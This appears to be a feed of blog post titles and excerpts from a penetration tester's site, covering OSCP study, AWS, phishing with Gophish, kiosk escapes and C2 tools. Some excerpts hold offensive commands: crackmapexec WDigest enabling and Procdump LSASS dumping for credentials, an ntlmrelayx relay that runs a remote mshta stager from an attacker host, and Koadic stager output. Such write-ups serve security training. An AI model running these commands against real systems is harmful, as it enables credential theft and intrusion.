item.title: ITerm2 Things That Will Help You!
item.description: ITerm2 Things That Will Help You! ðŸ§¨ # Gonna just make this as a quick reference to save you some reading. This read will make you so much better. TURN ON THE TOOLBELT!!!ðŸ› # Toolbelt > Show Toolbelt You will likely need to enable Shell Integration for COMMAND HISTORY to work. To do that run the following: $ curl -L https://iterm2.com/shell_integration/install_shell_integration_and_utilities.sh | bash # You can also use the Menu.

item.title: Sweetrolls AWS Solutions Architect Associate Experience
item.description: Overview # The Starting Line # Syllabus # Hands-On Experience # QwikLabs is a great source for walkthroughs on this and other labs. Online Lectures # â€¢ https://github.com/open-guides/og-aws â€¢ https://www.youtube.com/watch?v=0UZkc3q_DWI â€¢ Computing (EC2, Lambda) â€¢ Storage (EBS, EFS, S3) â€¢ Databases (RDS, DynamoDB, Redshift) â€¢ Scalability / Load Balancing (Beanstalk, ASG, CloudFormation) â€¢ Networking and Security (VPC, Route53, IAM, Cognito) â€¢ Monitoring (CloudWatch, CloudTrail, Flow Logs) â€¢ Miscellaneous services like SNS, SQS, SWF, Kinesis, and much more Practice Tests # A.

item.title: How to Phish Using a Jump Box Part 2
item.description: GoDaddy GUI Stuff ðŸ™ˆ # Setting Up Gophish GUI Stuff ðŸ”§ # The Landing Page: The page that’s going to be presented to users when they click your phishing link The Email Template: Email sent to your email targets Users & Groups: Email targets that will receive the phishing Email Sending Profiles: User that is going to be sending out the phishing email Landing Page âœˆ # The Email Template ðŸ“œ # Things to Note on the Email Template ðŸ“« # Users and Groups ðŸ˜œ # Spam Filters ðŸ’« # Campaign Settings ðŸ”« # Shout-outs ðŸ“¢ # __________________ < y0u L1tt13 L14R!

item.title: Helpful Tricks I Use to Get Domain Admin
item.description: So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks: Dumping Lsass on Windows 10 ðŸ˜‹ # Quick and Easy # Procdump # Getting The Dump Back ðŸ‘ˆ # So here’s the TLDR steps to do all this: Steps ðŸ‘Ÿ # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=enable Wait a while for the target user to auth to their system Use smbclient or Crackmapexec or whatever to upload Procdump and dump lsass with it: C:\users\ANOTHER-USER\desktop\procdump.

item.title: How to Phish Using a Jump Box Part 1
item.description: Installing Postfix # First thing you need to do to get started is install postfix on your jump box. â‹Š> /e/gophish sudo apt-get install postfix It also goes without saying that you should back this file up before making changes to it. cp /etc/postfix /etc/postfix.bak will do you well! You can see my postfix config file below: Configuring Postfix Main.cf # â‹Š> ~ cat /etc/postfix/main.cf 22:28:02 # See /usr/share/postfix/main.cf.dist for a commented, more complete version # Debian specific: Specifying a file name will cause the first # line of that file to be used as the name.

item.title: How to Use Silent Trinity - Bresaola 0.3.0dev
item.description: Overview â˜” # How to Use it –TLDRers Start here â¤µ # Installation â˜• # git clone https://github.com/byt3bl33d3r/SILENTTRINITY pip3 install pipenv && pipenv install && pipenv shell Once the pipenv is set up you should see something similar to what I have here (minus my Moofasa Cow!): clutchisback1@Deadpool /e/g/SILENTTRINITY $ pipenv shell 1 changed file master Launching subshell in virtual environmentâ€¦ ______ __ ____ _____ | _ \ \ / / __ / ___| ____| | |_) \ \ /\ / / '_ \| | _| _| | __/ \ V V /| | | | |_| | |___ |_| \_/\_/ |_| |_|\____|_____| _________ < L337Hax > --------- \ ____ \ / \ | ^__^ | | (oo) |______ | (__) | )\/\ \____/|----w | || || Moofasa (SILENTTRINITY) (SILENTTRINITY-9_xnHD7q) clutchisback1@HOMEPC â‰« $ Running Silent Trinity Things ðŸŒ€ # (SILENTTRINITY) (SILENTTRINITY-9_xnHD7q) clutchisback1@Deadpool â‰« $ sudo python3 teamserver.

item.title: Kiosk Escapes Pt 2 - Ft. Microsoft Edge!!
item.description: Backstory ðŸ“– # The Hac..I mean, Workaround Part –TLDRers Start here â¤µ # So, when you approach the Kiosk this is what you see; and in case you’re wondering, that windows key isn’t a part of the Windows OS it’s some “help” function as you can see: The interesting thing about this is that when you try to access the file system on Windows using Edge it actually opens the directory using Windows Explorer.

item.title: Installing Covenant v3.0 on Ubuntu 19
item.description: Intro # Installation Steps I took… -TLDRs Start Here â¤µ # To start off I cloned the repository recursively as instructed in the repo’s wiki: clutchisback1@Deadpool /e/github $ git clone --recurse-submodules https://github.com/cobbr/Covenant Cloning into 'Covenant'... remote: Enumerating objects: 1133, done. remote: Counting objects: 100% (1133/1133), done. remote: Compressing objects: 100% (548/548), done. remote: Total 1545 (delta 639), reused 996 (delta 560), pack-reused 412 Receiving objects: 100% (1545/1545), 22.18 MiB | 3.

item.title: How I Use Koadic on Internals
item.description: Overview # How I Use it on Internals # sudo ntlmrelayx.py -tf smb_off_hosts -smb2support --enum-local-admins -of 'save_the_NTLMv2hashes.txt' -c 'mshta http://AttackingHost:9999/sploit' What I Did for You Guys # Hacking things - TLDRs Start Here â¤µ # For demonstrative purposes I executed the mshta through windows explorer like so: (koadic: sta/js/mshta)$ run [+] Spawned a stager at http://AttackingIP:9999/sploit [!] Dont edit this URL! (See: 'help portfwd') [>] mshta http://AttackingIP:9999/sploit [+] Zombie 0: Staging new connection (100.

item.title: What It's Like Being a Pentester After OSCP
Windows 7 Kiosk Escape
item.description: Backstory # One day I was on site with client and was tasked with assessing an application for them. This was troubling for two reasons: 1.) This was my first on site assessment and 2.) due to the nature of the content I was tasked to work with, my little visit there required full supervision, which meant that my primary point of contact (POC) watched over my shoulder as I worked on this application for about 4 or so hours.

item.title: LazySysAdmin Writeup
A Pre-Exam For Future OSCP Students!
item.description: Exam Attempt 1 UPDATED (Aug 3, 2018) to redact file names and fix errors! Exam Attempt 1 Please Note: This exam is nothing more than Vulnhub boxes collected into a zip file with the file names changed to create a black box environment. No privileged Offensive Security exam details are disclosed in this exam.

item.title: Starting OSCP From Scratch
item.description: Read Time: 16 mins By: Clutchisback1 I hate reading boring articles so I’m not going to waste any of your time by writing one. Besides, you’re probably an PWK student with lab time ticking away each second as you get closer to your exam date; The very exam date that will determine whether or not you’ve become a man/woman yet in the information security industry. Right now, you’re still a little boy/girl with absolutely nothing going for yourself.
